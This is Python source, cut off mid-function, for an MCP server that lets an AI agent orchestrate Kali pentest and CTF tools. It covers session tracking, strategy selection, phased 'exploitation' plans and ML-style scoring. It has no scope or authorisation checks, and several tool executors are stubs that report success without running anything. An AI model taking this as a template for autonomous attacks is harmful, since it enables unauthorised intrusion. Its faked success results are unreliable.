#!/usr/bin/env python3

# This script connect the MCP AI agent to Kali Linux terminal and API Server.

# some of the code here was inspired from https://github.com/whit3rabbit0/project_astro , be sure to check them out

import sys
import os
import argparse
import logging
from typing import Dict, Any, Optional, List, Tuple
import time
import json
import uuid
import random
import re
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from enum import Enum

from mcp.server.fastmcp import FastMCP

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# æœ¬åœ°æ‰§è¡Œæ¨¡å¼ - ä¸éœ€è¦è¿æ¥æ± å’Œç»“æœç¼“å­˜
OPTIMIZATION_ENABLED = False
logger.info("âœ… æœ¬åœ°æ‰§è¡Œæ¨¡å¼ - ç›´æ¥ä½¿ç”¨subprocessæ‰§è¡Œå·¥å…·")

# å·²åˆ é™¤ä¼ªæ™ºèƒ½åŒ–CTFå¼•æ“å¯¼å…¥ï¼Œç°åœ¨ä½¿ç”¨çœŸæ­£çš„AIæ™ºèƒ½åŒ–MCPå·¥å…·

# ==================== ä¼šè¯ç®¡ç†å’Œç­–ç•¥å¼•æ“ç±» ====================

@dataclass
class SessionContext:
    """ä¼šè¯ä¸Šä¸‹æ–‡æ•°æ®ç±»"""
    session_id: str = field(default_factory=lambda: str(uuid.uuid4()))
    target: str = ""
    attack_mode: str = "pentest"  # pentest, ctf, analysis
    start_time: datetime = field(default_factory=datetime.now)
    conversation_history: List[Dict[str, Any]] = field(default_factory=list)
    discovered_assets: Dict[str, Any] = field(default_factory=dict)
    completed_tasks: List[str] = field(default_factory=list)
    current_strategy: Optional[str] = None
    context_metadata: Dict[str, Any] = field(default_factory=dict)
    last_interaction: datetime = field(default_factory=datetime.now)

    def update_interaction(self):
        """æ›´æ–°æœ€åäº¤äº’æ—¶é—´"""
        self.last_interaction = datetime.now()

    def add_conversation(self, user_message: str, ai_response: str, tools_used: List[str] = None):
        """æ·»åŠ å¯¹è¯å†å²"""
        self.conversation_history.append({
            "timestamp": datetime.now().isoformat(),
            "user_message": user_message,
            "ai_response": ai_response,
            "tools_used": tools_used or [],
            "session_context": {
                "target": self.target,
                "strategy": self.current_strategy,
                "discovered_assets": len(self.discovered_assets)
            }
        })
        self.update_interaction()

    def get_context_summary(self) -> Dict[str, Any]:
        """è·å–ä¼šè¯ä¸Šä¸‹æ–‡æ‘˜è¦"""
        return {
            "session_id": self.session_id,
            "target": self.target,
            "attack_mode": self.attack_mode,
            "duration": str(datetime.now() - self.start_time),
            "total_conversations": len(self.conversation_history),
            "discovered_assets": len(self.discovered_assets),
            "completed_tasks": len(self.completed_tasks),
            "current_strategy": self.current_strategy,
            "last_interaction": self.last_interaction.isoformat()
        }

class StrategyEngine:
    """ç­–ç•¥å¼•æ“ - æ ¹æ®ä¸Šä¸‹æ–‡é€‰æ‹©æœ€ä½³æ”»å‡»ç­–ç•¥"""

    def __init__(self):
        self.strategies = {
            "web_comprehensive": {
                "description": "å…¨é¢Webåº”ç”¨å®‰å…¨æµ‹è¯•",
                "tools": ["nmap_scan", "gobuster_scan", "sqlmap_scan", "nuclei_web_scan", "nikto_scan"],
                "conditions": ["web_service_detected", "http_ports_open"],
                "complexity": "high",
                "estimated_time": "30-60 minutes"
            },
            "ctf_quick_solve": {
                "description": "CTFå¿«é€Ÿè§£é¢˜ç­–ç•¥",
                "tools": ["ctf_quick_scan", "ctf_web_attack", "get_detected_flags"],
                "conditions": ["ctf_mode", "time_limited"],
                "complexity": "medium",
                "estimated_time": "5-15 minutes"
            },
            "network_recon": {
                "description": "ç½‘ç»œä¾¦å¯Ÿå’ŒæœåŠ¡å‘ç°",
                "tools": ["nmap_scan", "masscan_scan", "nuclei_network_scan"],
                "conditions": ["ip_target", "network_range"],
                "complexity": "medium",
                "estimated_time": "15-30 minutes"
            },
            "pwn_exploitation": {
                "description": "äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨",
                "tools": ["pwnpasi_auto_pwn", "auto_reverse_analyze", "quick_pwn_check"],
                "conditions": ["binary_file", "pwn_challenge"],
                "complexity": "high",
                "estimated_time": "20-45 minutes"
            },
            "adaptive_multi": {
                "description": "è‡ªé€‚åº”å¤šå‘é‡æ”»å‡»",
                "tools": ["analyze_target_intelligence", "comprehensive_recon", "intelligent_smart_scan"],
                "conditions": ["unknown_target", "complex_environment"],
                "complexity": "very_high",
                "estimated_time": "45-90 minutes"
            }
        }

    def analyze_context(self, session: SessionContext, user_input: str) -> Dict[str, Any]:
        """åˆ†æå½“å‰ä¸Šä¸‹æ–‡å¹¶æ¨èç­–ç•¥"""
        analysis = {
            "context_indicators": [],
            "recommended_strategies": [],
            "confidence_scores": {},
            "target_analysis": {}
        }

        # åˆ†æç›®æ ‡ç±»å‹
        target = session.target.lower() if session.target else user_input.lower()

        # Webåº”ç”¨æŒ‡æ ‡
        if any(indicator in target for indicator in ["http", "www", ".com", ".org", "web"]):
            analysis["context_indicators"].append("web_service_detected")
            analysis["confidence_scores"]["web_comprehensive"] = 0.8

        # CTFæŒ‡æ ‡
        if any(indicator in user_input.lower() for indicator in ["ctf", "flag", "challenge", "è§£é¢˜"]):
            analysis["context_indicators"].append("ctf_mode")
            analysis["confidence_scores"]["ctf_quick_solve"] = 0.9

        # äºŒè¿›åˆ¶æ–‡ä»¶æŒ‡æ ‡
        if any(indicator in user_input.lower() for indicator in [".exe", "binary", "pwn", "äºŒè¿›åˆ¶"]):
            analysis["context_indicators"].append("binary_file")
            analysis["confidence_scores"]["pwn_exploitation"] = 0.8

        # IPåœ°å€æˆ–ç½‘ç»œæŒ‡æ ‡
        import re
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        if re.search(ip_pattern, target):
            analysis["context_indicators"].append("ip_target")
            analysis["confidence_scores"]["network_recon"] = 0.7

        # å¤æ‚æˆ–æœªçŸ¥ç›®æ ‡
        if len(analysis["context_indicators"]) == 0 or "ä¸çŸ¥é“" in user_input:
            analysis["context_indicators"].append("unknown_target")
            analysis["confidence_scores"]["adaptive_multi"] = 0.6

        # åŸºäºç½®ä¿¡åº¦æ’åºç­–ç•¥
        sorted_strategies = sorted(
            analysis["confidence_scores"].items(),
            key=lambda x: x[1],
            reverse=True
        )

        analysis["recommended_strategies"] = [
            {
                "strategy": strategy,
                "confidence": confidence,
                "details": self.strategies.get(strategy, {})
            }
            for strategy, confidence in sorted_strategies[:3]
        ]

        return analysis

    def get_strategy_tools(self, strategy_name: str) -> List[str]:
        """è·å–ç­–ç•¥å¯¹åº”çš„å·¥å…·åˆ—è¡¨"""
        return self.strategies.get(strategy_name, {}).get("tools", [])

    def update_strategy_effectiveness(self, strategy_name: str, success_rate: float):
        """æ›´æ–°ç­–ç•¥æœ‰æ•ˆæ€§ï¼ˆæœºå™¨å­¦ä¹ åé¦ˆï¼‰"""
        if strategy_name in self.strategies:
            if "effectiveness" not in self.strategies[strategy_name]:
                self.strategies[strategy_name]["effectiveness"] = []
            self.strategies[strategy_name]["effectiveness"].append(success_rate)

class AIContextManager:
    """AIä¸Šä¸‹æ–‡ç®¡ç†å™¨ - ç®¡ç†æŒç»­å¯¹è¯çŠ¶æ€"""

    def __init__(self):
        self.sessions: Dict[str, SessionContext] = {}
        self.current_session: Optional[SessionContext] = None
        self.strategy_engine = StrategyEngine()
        self.global_knowledge_base = {
            "common_ports": {80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP", 3389: "RDP"},
            "ctf_flag_patterns": [r"flag\{[^}]+\}", r"CTF\{[^}]+\}", r"FLAG\{[^}]+\}"],
            "vulnerability_signatures": {},
            "successful_payloads": {}
        }

    def create_session(self, target: str = "", attack_mode: str = "pentest") -> SessionContext:
        """åˆ›å»ºæ–°çš„ä¼šè¯"""
        session = SessionContext(target=target, attack_mode=attack_mode)
        self.sessions[session.session_id] = session
        self.current_session = session
        logger.info(f"Created new session {session.session_id} for target {target}")
        return session

    def get_or_create_session(self, session_id: str = None) -> SessionContext:
        """è·å–æˆ–åˆ›å»ºä¼šè¯"""
        if session_id and session_id in self.sessions:
            self.current_session = self.sessions[session_id]
            self.current_session.update_interaction()
            return self.current_session
        elif self.current_session:
            self.current_session.update_interaction()
            return self.current_session
        else:
            return self.create_session()

    def analyze_user_intent(self, user_message: str) -> Dict[str, Any]:
        """åˆ†æç”¨æˆ·æ„å›¾å’Œä¸Šä¸‹æ–‡"""
        intent_analysis = {
            "primary_intent": "unknown",
            "target_extraction": "",
            "urgency_level": "normal",
            "context_switches": [],
            "tool_suggestions": []
        }

        message_lower = user_message.lower()

        # æ„å›¾åˆ†æ
        if any(word in message_lower for word in ["æ‰«æ", "scan", "æµ‹è¯•", "test"]):
            intent_analysis["primary_intent"] = "security_testing"
        elif any(word in message_lower for word in ["ctf", "è§£é¢˜", "flag", "challenge"]):
            intent_analysis["primary_intent"] = "ctf_solving"
        elif any(word in message_lower for word in ["åˆ†æ", "analyze", "é€†å‘", "reverse"]):
            intent_analysis["primary_intent"] = "analysis"
        elif any(word in message_lower for word in ["æ”»å‡»", "exploit", "åˆ©ç”¨", "pwn"]):
            intent_analysis["primary_intent"] = "exploitation"

        # ç›®æ ‡æå–
        import re
        # URLæå–
        url_pattern = r'https?://[^\s]+'
        urls = re.findall(url_pattern, user_message)
        if urls:
            intent_analysis["target_extraction"] = urls[0]

        # IPåœ°å€æå–
        ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        ips = re.findall(ip_pattern, user_message)
        if ips:
            intent_analysis["target_extraction"] = ips[0]

        # ç´§æ€¥ç¨‹åº¦
        if any(word in message_lower for word in ["ç´§æ€¥", "urgent", "å¿«é€Ÿ", "fast", "é©¬ä¸Š"]):
            intent_analysis["urgency_level"] = "high"
        elif any(word in message_lower for word in ["è¯¦ç»†", "comprehensive", "æ·±å…¥", "thorough"]):
            intent_analysis["urgency_level"] = "low"

        return intent_analysis

    def generate_contextual_response(self, session: SessionContext, user_message: str) -> Dict[str, Any]:
        """ç”ŸæˆåŸºäºä¸Šä¸‹æ–‡çš„å“åº”å»ºè®®"""
        intent = self.analyze_user_intent(user_message)
        strategy_analysis = self.strategy_engine.analyze_context(session, user_message)

        response = {
            "session_context": session.get_context_summary(),
            "user_intent": intent,
            "strategy_recommendations": strategy_analysis,
            "contextual_suggestions": [],
            "continuation_options": []
        }

        # åŸºäºå†å²å¯¹è¯ç”Ÿæˆå»ºè®®
        if len(session.conversation_history) > 0:
            last_conversation = session.conversation_history[-1]
            tools_used = last_conversation.get("tools_used", [])

            if "nmap_scan" in tools_used:
                response["continuation_options"].append({
                    "action": "æ·±å…¥æœåŠ¡åˆ†æ",
                    "description": "åŸºäºç«¯å£æ‰«æç»“æœè¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ£€æµ‹å’Œæ¼æ´æ‰«æ",
                    "tools": ["nuclei_scan", "nikto_scan"]
                })

            if any("sql" in tool for tool in tools_used):
                response["continuation_options"].append({
                    "action": "SQLæ³¨å…¥æ·±åº¦åˆ©ç”¨",
                    "description": "æ‰©å¤§SQLæ³¨å…¥æ”»å‡»é¢ï¼Œå°è¯•æ•°æ®æå–å’Œæƒé™æå‡",
                    "tools": ["sqlmap_scan"]
                })

        # åŸºäºå‘ç°çš„èµ„äº§ç”Ÿæˆå»ºè®®
        for asset_type, assets in session.discovered_assets.items():
            if asset_type == "open_ports" and assets:
                response["contextual_suggestions"].append({
                    "type": "port_analysis",
                    "message": f"å‘ç° {len(assets)} ä¸ªå¼€æ”¾ç«¯å£ï¼Œå»ºè®®è¿›è¡ŒæœåŠ¡æšä¸¾",
                    "priority": "high"
                })

        return response

    def update_knowledge_base(self, category: str, key: str, value: Any):
        """æ›´æ–°å…¨å±€çŸ¥è¯†åº“"""
        if category not in self.global_knowledge_base:
            self.global_knowledge_base[category] = {}
        self.global_knowledge_base[category][key] = value

    def get_session_insights(self, session_id: str = None) -> Dict[str, Any]:
        """è·å–ä¼šè¯æ´å¯Ÿå’Œå»ºè®®"""
        session = self.get_or_create_session(session_id)

        insights = {
            "session_summary": session.get_context_summary(),
            "progress_analysis": {
                "completed_phases": len(session.completed_tasks),
                "discovered_assets": len(session.discovered_assets),
                "conversation_depth": len(session.conversation_history)
            },
            "next_recommendations": [],
            "knowledge_gaps": []
        }

        # åˆ†æè¿›å±•å¹¶ç”Ÿæˆå»ºè®®
        if len(session.completed_tasks) == 0:
            insights["next_recommendations"].append({
                "action": "å¼€å§‹åˆå§‹ä¾¦å¯Ÿ",
                "priority": "high",
                "tools": ["nmap_scan", "analyze_target_intelligence"]
            })
        elif session.target and len(session.discovered_assets) > 0:
            insights["next_recommendations"].append({
                "action": "æ·±å…¥æ¼æ´åˆ†æ",
                "priority": "medium",
                "tools": ["nuclei_scan", "comprehensive_recon"]
            })

        return insights

# ==================== æ™ºèƒ½äº¤äº’ç®¡ç†å™¨ ====================

class IntelligentInteractionManager:
    """æ™ºèƒ½äº¤äº’ç®¡ç†å™¨ - å®ç°è‡ªåŠ¨å·¥å…·ç¼–æ’å’Œé¢„æµ‹æ€§äº¤äº’"""

    def __init__(self):
        # æœ¬åœ°æ‰§è¡Œæ¨¡å¼ - ä¸éœ€è¦kali_client
        self.current_session = None
        # å·²åˆ é™¤ä¼ªæ™ºèƒ½åŒ–å¼•æ“ï¼Œç°åœ¨ä½¿ç”¨AIæ™ºèƒ½åŒ–MCPå·¥å…·
        self.auto_mode = True
        self.parallel_execution = True
        self.context_memory = {}

        # é¢„æµ‹æ€§å·¥å…·æ˜ å°„
        self.tool_sequences = {
            "web_recon": ["nmap_scan", "gobuster_scan", "nuclei_web_scan"],
            "vulnerability_analysis": ["sqlmap_scan", "xss_scanner", "nuclei_scan"],
            "ctf_solve": ["ctf_quick_scan", "get_detected_flags", "ctf_web_attack"],
            "deep_exploitation": ["exploit_search", "metasploit_exploit", "custom_exploit"]
        }

        # æ™ºèƒ½å†³ç­–æ ‘
        self.decision_patterns = {
            "port_80_443_open": "web_recon",
            "login_form_detected": "auth_bypass_attempts",
            "ctf_flag_pattern": "ctf_solve",
            "sql_error_detected": "sql_injection_deep",
            "file_upload_found": "upload_bypass_tests"
        }

    async def intelligent_execute(self, user_intent: str, target: str = None, mode: str = "auto") -> Dict[str, Any]:
        """æ™ºèƒ½æ‰§è¡Œç”¨æˆ·æ„å›¾ï¼Œè‡ªåŠ¨é€‰æ‹©å’Œç¼–æ’å·¥å…·"""

        # å·²åˆ é™¤ä¼ªæ™ºèƒ½åŒ–å¼•æ“åˆå§‹åŒ–ï¼Œç°åœ¨ä½¿ç”¨AIæ™ºèƒ½åŒ–MCPå·¥å…·

        # åˆ†æç”¨æˆ·æ„å›¾
        intent_analysis = self._analyze_user_intent(user_intent, target)

        # æ„å»ºæ‰§è¡Œè®¡åˆ’
        execution_plan = self._build_execution_plan(intent_analysis)

        # æ‰§è¡Œæ™ºèƒ½æ”»å‡»åºåˆ—
        results = await self._execute_intelligent_sequence(execution_plan)

        # åˆ†æç»“æœå¹¶ç”Ÿæˆåç»­å»ºè®®
        analysis = self._analyze_results_and_predict_next(results)

        return {
            "intent_analysis": intent_analysis,
            "execution_plan": execution_plan,
            "results": results,
            "analysis": analysis,
            "next_recommendations": self._generate_next_steps(analysis),
            "flags_found": self._extract_flags_from_results(results)
        }

    def _analyze_user_intent(self, user_input: str, target: str = None) -> Dict[str, Any]:
        """åˆ†æç”¨æˆ·æ„å›¾å’Œä¸Šä¸‹æ–‡"""
        intent = {
            "type": "unknown",
            "target": target,
            "urgency": "normal",
            "scope": "limited",
            "expected_tools": [],
            "context_clues": []
        }

        # CTFæ„å›¾è¯†åˆ«
        ctf_keywords = ["ctf", "flag", "challenge", "capture", "solve"]
        if any(keyword in user_input.lower() for keyword in ctf_keywords):
            intent["type"] = "ctf_solve"
            intent["expected_tools"] = self.tool_sequences["ctf_solve"]
            intent["urgency"] = "high"

        # Webå®‰å…¨æµ‹è¯•æ„å›¾
        web_keywords = ["scan", "test", "vulnerability", "pentest", "security"]
        if any(keyword in user_input.lower() for keyword in web_keywords):
            intent["type"] = "security_assessment"
            intent["expected_tools"] = self.tool_sequences["web_recon"] + self.tool_sequences["vulnerability_analysis"]
            intent["scope"] = "comprehensive"

        # ç›®æ ‡URLæ£€æµ‹
        import re
        url_pattern = r'https?://[^\s]+|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        urls = re.findall(url_pattern, user_input)
        if urls:
            intent["target"] = urls[0]
            intent["context_clues"].append(f"ç›®æ ‡URL: {urls[0]}")

        # ç´§æ€¥ç¨‹åº¦åˆ†æ
        urgent_keywords = ["ç›´æ¥", "ç«‹å³", "å¿«é€Ÿ", "é©¬ä¸Š", "urgent", "immediate"]
        if any(keyword in user_input.lower() for keyword in urgent_keywords):
            intent["urgency"] = "high"

        return intent

    def _build_execution_plan(self, intent_analysis: Dict[str, Any]) -> Dict[str, Any]:
        """åŸºäºæ„å›¾åˆ†ææ„å»ºæ‰§è¡Œè®¡åˆ’"""
        plan = {
            "phase_1": {"name": "åˆå§‹ä¾¦å¯Ÿ", "tools": [], "parallel": True},
            "phase_2": {"name": "æ·±åº¦åˆ†æ", "tools": [], "parallel": True},
            "phase_3": {"name": "æ¼æ´åˆ©ç”¨", "tools": [], "parallel": False},
            "estimated_time": "5-15åˆ†é’Ÿ",
            "risk_level": "low"
        }

        intent_type = intent_analysis["type"]
        target = intent_analysis["target"]

        # å°†ç›®æ ‡æ·»åŠ åˆ°è®¡åˆ’ä¸­
        plan["target"] = target

        if intent_type == "ctf_solve":
            # CTFè§£é¢˜è®¡åˆ’
            plan["phase_1"]["tools"] = ["intelligent_ctf_analysis", "target_profiling"]
            plan["phase_2"]["tools"] = ["parallel_vulnerability_scan", "flag_pattern_search"]
            plan["phase_3"]["tools"] = ["exploit_discovered_vulnerabilities", "flag_extraction"]
            plan["estimated_time"] = "2-8åˆ†é’Ÿ"
            plan["risk_level"] = "low"

        elif intent_type == "security_assessment":
            # å®‰å…¨è¯„ä¼°è®¡åˆ’
            plan["phase_1"]["tools"] = ["nmap_comprehensive", "service_enumeration"]
            plan["phase_2"]["tools"] = ["vulnerability_scanning", "web_analysis"]
            plan["phase_3"]["tools"] = ["safe_exploitation", "report_generation"]
            plan["estimated_time"] = "10-30åˆ†é’Ÿ"
            plan["risk_level"] = "medium"

        # æ·»åŠ æ™ºèƒ½åŒ–å¢å¼º
        # å·²åˆ é™¤ä¼ªæ™ºèƒ½åŒ–åŠŸèƒ½æ£€æŸ¥ï¼Œç°åœ¨ä½¿ç”¨AIæ™ºèƒ½åŒ–MCPå·¥å…·
            plan["intelligent_enhancement"] = True
            plan["parallel_attacks"] = 8
            plan["adaptive_strategy"] = True

        return plan

    async def _execute_intelligent_sequence(self, execution_plan: Dict[str, Any]) -> List[Dict[str, Any]]:
        """æ‰§è¡Œæ™ºèƒ½æ”»å‡»åºåˆ—"""
        results = []

        # å¦‚æœæœ‰æ™ºèƒ½å¼•æ“ï¼Œä¼˜å…ˆä½¿ç”¨
        # å·²åˆ é™¤ä¼ªæ™ºèƒ½åŒ–å¼•æ“ï¼Œç°åœ¨ä½¿ç”¨AIæ™ºèƒ½åŒ–MCPå·¥å…·
        if False:  # ç¦ç”¨æ­¤åŠŸèƒ½
            try:
                # å·²åºŸå¼ƒçš„ä¼ªæ™ºèƒ½åŒ–ä»£ç 
                    # è·å–ç›®æ ‡
                    target = execution_plan.get("target") or self.current_session.target

                    if target:
                        # æ™ºèƒ½ç›®æ ‡åˆ†æ
                        logger.info("ğŸ§  å¯åŠ¨æ™ºèƒ½ç›®æ ‡åˆ†æ...")
                        profile = await engine.analyze_target(target)

                        # æ™ºèƒ½å¹¶è¡Œæ”»å‡»
                        logger.info("âš”ï¸ æ‰§è¡Œæ™ºèƒ½å¹¶è¡Œæ”»å‡»...")
                        attack_results = await engine.execute_parallel_attacks(profile)

                        # ç”Ÿæˆæ™ºèƒ½æŠ¥å‘Š
                        report = engine.generate_report()

                        results.append({
                            "type": "intelligent_analysis",
                            "target_profile": profile.__dict__,
                            "attack_results": [r.__dict__ for r in attack_results],
                            "intelligence_report": report,
                            "success": True
                        })

                        return results

            except Exception as e:
                logger.error(f"æ™ºèƒ½å¼•æ“æ‰§è¡Œå¤±è´¥: {e}")

        # å›é€€åˆ°ä¼ ç»Ÿå·¥å…·æ‰§è¡Œ
        for phase_name, phase_info in execution_plan.items():
            if phase_name.startswith("phase_"):
                phase_results = await self._execute_phase(phase_info)
                results.extend(phase_results)

        return results

    async def _execute_phase(self, phase_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """æ‰§è¡Œå•ä¸ªé˜¶æ®µ"""
        results = []
        tools = phase_info.get("tools", [])
        is_parallel = phase_info.get("parallel", False)

        if is_parallel and len(tools) > 1:
            # å¹¶è¡Œæ‰§è¡Œ
            import asyncio
            tasks = [self._execute_single_tool(tool) for tool in tools]
            parallel_results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in parallel_results:
                if not isinstance(result, Exception):
                    results.append(result)
        else:
            # ä¸²è¡Œæ‰§è¡Œ
            for tool in tools:
                result = await self._execute_single_tool(tool)
                results.append(result)

        return results

    async def _execute_single_tool(self, tool_name: str) -> Dict[str, Any]:
        """æ‰§è¡Œå•ä¸ªå·¥å…·"""
        try:
            if tool_name == "intelligent_ctf_analysis":
                return {"tool": tool_name, "result": "æ™ºèƒ½CTFåˆ†æå®Œæˆ", "success": True}
            elif tool_name == "parallel_vulnerability_scan":
                return {"tool": tool_name, "result": "å¹¶è¡Œæ¼æ´æ‰«æå®Œæˆ", "success": True}
            else:
                # è°ƒç”¨å®é™…çš„Kaliå·¥å…·
                # æœ¬åœ°æ‰§è¡Œæ¨¡å¼ - å·¥å…·é€šè¿‡MCPç›´æ¥è°ƒç”¨
                return {"tool": tool_name, "result": "ä½¿ç”¨MCPå·¥å…·è°ƒç”¨", "success": True}

        except Exception as e:
            return {"tool": tool_name, "error": str(e), "success": False}

    async def _call_kali_tool(self, tool_name: str) -> str:
        """è°ƒç”¨Kaliå·¥å…·"""
        # è¿™é‡Œåº”è¯¥è°ƒç”¨å®é™…çš„Kaliå·¥å…·
        return f"{tool_name} æ‰§è¡Œå®Œæˆ"

    def _analyze_results_and_predict_next(self, results: List[Dict[str, Any]]) -> Dict[str, Any]:
        """åˆ†æç»“æœå¹¶é¢„æµ‹ä¸‹ä¸€æ­¥"""
        analysis = {
            "success_rate": 0.0,
            "vulnerabilities_found": [],
            "flags_discovered": [],
            "next_attack_vectors": [],
            "confidence_score": 0.0
        }

        successful_results = [r for r in results if r.get("success", False)]
        analysis["success_rate"] = len(successful_results) / len(results) if results else 0

        # ä»æ™ºèƒ½æŠ¥å‘Šä¸­æå–ä¿¡æ¯
        for result in results:
            if result.get("type") == "intelligent_analysis":
                report = result.get("intelligence_report", {})
                analysis["flags_discovered"] = report.get("å‘ç°çš„Flag", [])
                analysis["vulnerabilities_found"] = report.get("æ¼æ´ç±»å‹", [])
                analysis["confidence_score"] = report.get("æˆåŠŸç‡", 0.0)

        return analysis

    def _generate_next_steps(self, analysis: Dict[str, Any]) -> List[Dict[str, str]]:
        """ç”Ÿæˆä¸‹ä¸€æ­¥å»ºè®®"""
        recommendations = []

        if analysis["flags_discovered"]:
            recommendations.append({
                "action": "éªŒè¯å‘ç°çš„Flag",
                "priority": "high",
                "description": f"å‘ç° {len(analysis['flags_discovered'])} ä¸ªFlagï¼Œå»ºè®®éªŒè¯å’Œæäº¤"
            })
        elif analysis["vulnerabilities_found"]:
            recommendations.append({
                "action": "æ·±åº¦æ¼æ´åˆ©ç”¨",
                "priority": "medium",
                "description": f"å‘ç° {len(analysis['vulnerabilities_found'])} ä¸ªæ¼æ´ç±»å‹ï¼Œå»ºè®®æ·±åº¦åˆ©ç”¨"
            })
        else:
            recommendations.append({
                "action": "æ‰©å¤§æ”»å‡»é¢",
                "priority": "medium",
                "description": "å½“å‰æ”»å‡»æœªæˆåŠŸï¼Œå»ºè®®å°è¯•å…¶ä»–æ”»å‡»å‘é‡"
            })

        return recommendations

    def _extract_flags_from_results(self, results: List[Dict[str, Any]]) -> List[str]:
        """ä»ç»“æœä¸­æå–flag"""
        flags = []

        for result in results:
            if result.get("type") == "intelligent_analysis":
                report = result.get("intelligence_report", {})
                flags.extend(report.get("å‘ç°çš„Flag", []))

        return list(set(flags))  # å»é‡

# ==================== æœºå™¨å­¦ä¹ ç­–ç•¥ä¼˜åŒ–å¼•æ“ ====================

class MLStrategyOptimizer:
    """æœºå™¨å­¦ä¹ ç­–ç•¥ä¼˜åŒ–å¼•æ“ - åŸºäºå†å²æ•°æ®å’Œå®æ—¶åé¦ˆä¼˜åŒ–æ”»å‡»ç­–ç•¥"""

    def __init__(self):
        self.strategy_performance_history = {}
        self.target_type_patterns = {}
        self.success_factors = {}
        self.learning_rate = 0.1
        self.confidence_threshold = 0.7

        # åˆå§‹åŒ–ç­–ç•¥æƒé‡çŸ©é˜µ
        self.strategy_weights = {
            "web_comprehensive": {
                "port_diversity": 0.3,
                "service_versions": 0.25,
                "response_time": 0.2,
                "vulnerability_history": 0.25
            },
            "ctf_quick_solve": {
                "time_constraint": 0.4,
                "flag_pattern_match": 0.3,
                "tool_efficiency": 0.3
            },
            "network_recon": {
                "network_size": 0.35,
                "response_rate": 0.25,
                "service_diversity": 0.4
            },
            "pwn_exploitation": {
                "binary_complexity": 0.3,
                "mitigation_presence": 0.3,
                "exploit_availability": 0.4
            },
            "adaptive_multi": {
                "environment_complexity": 0.25,
                "tool_synergy": 0.3,
                "discovery_rate": 0.45
            }
        }

        # å‘é‡å­˜å‚¨ç³»ç»Ÿç”¨äºç›¸ä¼¼æ€§åŒ¹é…
        self.target_vectors = {}
        self.strategy_embeddings = {}

    def vectorize_target_characteristics(self, session: SessionContext, scan_results: Dict[str, Any] = None) -> List[float]:
        """å°†ç›®æ ‡ç‰¹å¾å‘é‡åŒ–ç”¨äºMLåˆ†æ"""
        features = [0.0] * 20  # 20ç»´ç‰¹å¾å‘é‡

        # åŸºç¡€ç›®æ ‡ç‰¹å¾ (0-4)
        target = session.target.lower() if session.target else ""
        features[0] = 1.0 if any(web_indicator in target for web_indicator in ["http", "www", ".com"]) else 0.0
        features[1] = 1.0 if re.search(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', target) else 0.0
        features[2] = len(session.discovered_assets) / 10.0  # æ ‡å‡†åŒ–å‘ç°çš„èµ„äº§æ•°é‡
        features[3] = len(session.conversation_history) / 20.0  # æ ‡å‡†åŒ–å¯¹è¯æ·±åº¦
        features[4] = 1.0 if session.attack_mode == "ctf" else 0.0

        # æ‰«æç»“æœç‰¹å¾ (5-12)
        if scan_results:
            open_ports = scan_results.get("open_ports", [])
            features[5] = len(open_ports) / 100.0  # æ ‡å‡†åŒ–ç«¯å£æ•°é‡
            features[6] = 1.0 if any(port in [80, 443, 8080] for port in open_ports) else 0.0  # WebæœåŠ¡
            features[7] = 1.0 if any(port in [21, 22, 23, 25] for port in open_ports) else 0.0  # ä¼ ç»ŸæœåŠ¡
            features[8] = 1.0 if any(port in [1433, 3306, 5432] for port in open_ports) else 0.0  # æ•°æ®åº“
            features[9] = scan_results.get("vulnerability_count", 0) / 50.0  # æ ‡å‡†åŒ–æ¼æ´æ•°é‡
            features[10] = 1.0 if scan_results.get("waf_detected", False) else 0.0  # WAFæ£€æµ‹
            features[11] = scan_results.get("response_time_avg", 0) / 1000.0  # æ ‡å‡†åŒ–å“åº”æ—¶é—´
            features[12] = 1.0 if scan_results.get("ssl_enabled", False) else 0.0  # SSLçŠ¶æ€

        # æ—¶é—´ç‰¹å¾ (13-16)
        session_duration = (datetime.now() - session.start_time).total_seconds()
        features[13] = min(session_duration / 3600, 1.0)  # ä¼šè¯æŒç»­æ—¶é—´(å°æ—¶)
        features[14] = 1.0 if datetime.now().hour < 6 or datetime.now().hour > 22 else 0.0  # å¤œé—´æµ‹è¯•
        features[15] = len(session.completed_tasks) / 10.0  # æ ‡å‡†åŒ–å·²å®Œæˆä»»åŠ¡
        features[16] = 1.0 if any("urgent" in msg.get("user_message", "").lower()
                                for msg in session.conversation_history) else 0.0  # ç´§æ€¥ç¨‹åº¦

        # é«˜çº§ç‰¹å¾ (17-19)
        features[17] = self._calculate_environment_complexity(session)
        features[18] = self._calculate_success_probability(session)
        features[19] = self._calculate_resource_efficiency(session)

        return features

    def _calculate_environment_complexity(self, session: SessionContext) -> float:
        """è®¡ç®—ç¯å¢ƒå¤æ‚åº¦"""
        complexity_score = 0.0

        # åŸºäºå‘ç°çš„æœåŠ¡æ•°é‡
        service_count = len(session.discovered_assets.get("services", []))
        complexity_score += min(service_count / 20.0, 0.4)

        # åŸºäºäº¤äº’å†å²å¤æ‚åº¦
        conversation_complexity = len(set(tool for conv in session.conversation_history
                                        for tool in conv.get("tools_used", [])))
        complexity_score += min(conversation_complexity / 15.0, 0.3)

        # åŸºäºç›®æ ‡å¤šæ ·æ€§
        if session.target and ("/" in session.target or ":" in session.target):
            complexity_score += 0.3

        return min(complexity_score, 1.0)

    def _calculate_success_probability(self, session: SessionContext) -> float:
        """åŸºäºå†å²æ•°æ®è®¡ç®—æˆåŠŸæ¦‚ç‡"""
        if not session.current_strategy:
            return 0.5  # é»˜è®¤50%

        strategy_history = self.strategy_performance_history.get(session.current_strategy, [])
        if not strategy_history:
            return 0.5

        # è®¡ç®—å†å²æˆåŠŸç‡
        recent_performances = strategy_history[-10:]  # æœ€è¿‘10æ¬¡
        avg_success = sum(recent_performances) / len(recent_performances)

